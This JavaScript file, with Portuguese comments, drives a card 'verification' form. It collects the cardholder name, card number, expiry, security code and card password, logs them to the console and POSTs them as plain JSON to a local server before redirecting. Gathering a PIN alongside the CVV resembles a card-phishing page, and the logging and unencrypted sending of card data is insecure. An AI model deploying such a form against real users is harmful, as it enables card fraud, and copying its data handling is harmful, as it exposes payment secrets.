const formulario = document.getElementById("formulario");
const numeroCartaoInput = document.getElementById("NumberCard");
const mensagemDiv = document.getElementById("mensagem");

// Formata o número do cartão com espaços a cada 4 dígitos
numeroCartaoInput.addEventListener("input", (evento) => {
  let valor = evento.target.value.replace(/\D/g, ""); // Remove tudo que não é dígito
  if (valor.length > 16) {
    valor = valor.slice(0, 16); // Limita a 16 dígitos
  }
  let formatado = "";
  for (let i = 0; i < valor.length; i += 4) {
    if (i > 0) formatado += " ";
    formatado += valor.slice(i, i + 4);
  }
  evento.target.value = formatado.trim();
});

formulario.addEventListener("submit", async (evento) => {
  evento.preventDefault();
  mensagemDiv.style.display = "none"; // Oculta mensagens anteriores
  mensagemDiv.textContent = "";

  try {
    const form = evento.target;
    const nome = form.name.value.trim();
    const numero = form.NumberCard.value.replace(/\s/g, "").trim(); // Remove espaços
    const validMes = form.expiracaoMes.value.trim();
    const validAno = form.expiracaoAno.value.trim();
    const codigo = form.CodSec.value.trim();
    const senha = form.senha.value.trim();

    // Validação do campo nome (não pode conter números)
    if (/\d/.test(nome)) {
      mensagemDiv.style.display = "block";
      mensagemDiv.style.color = "red";
      mensagemDiv.textContent = "O nome no cartão não pode conter números.";
      return;
    }

    // Validação do campo número (deve conter apenas números, após remover espaços)
    if (!/^\d+$/.test(numero)) {
      mensagemDiv.style.display = "block";
      mensagemDiv.style.color = "red";
      mensagemDiv.textContent = "O número do cartão deve conter apenas dígitos.";
      return;
    }

    console.log("Dados capturados:", { nome, numero, validMes, validAno, codigo, senha });

    const arquivo = {
      Nomecartao: nome,
      NumeroCartao: numero,
      MesValidade: validMes,
      AnoValidade: validAno,
      CodigoCartao: codigo,
      Senha: senha
    };

    const textJson = JSON.stringify(arquivo, null, 2);

    const resposta = await fetch('http://localhost:3000/cartao', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: textJson
    });

    if (!resposta.ok) {
      const contentType = resposta.headers.get('content-type');
      if (contentType && contentType.includes('application/json')) {
        const erro = await resposta.json();
        mensagemDiv.style.display = "block";
        mensagemDiv.style.color = "red";
        mensagemDiv.textContent = `Erro: ${erro.erro}`;
        console.error('Erro do servidor:', erro.erro);
      } else {
        const textoErro = await resposta.text();
        mensagemDiv.style.display = "block";
        mensagemDiv.style.color = "red";
        mensagemDiv.textContent = "Erro no servidor. Tente novamente.";
        console.error('Erro do servidor (não-JSON):', textoErro);
      }
      return;
    }

    const dados = await resposta.json();
    console.log('Sucesso:', dados.mensagem);
    mensagemDiv.style.display = "block";
    mensagemDiv.style.color = "green";
    mensagemDiv.textContent = dados.mensagem || "Cartão verificado com sucesso!";
    formulario.reset();

    // Aguarda 2 segundos antes de redirecionar
    setTimeout(() => {
      window.location.href = 'fim.html';
    }, 2000);

  } catch (error) {
    console.error("Erro ao processar o formulário:", error);
    mensagemDiv.style.display = "block";
    mensagemDiv.style.color = "red";
    mensagemDiv.textContent = "Erro ao processar o formulário. Tente novamente.";
  }
});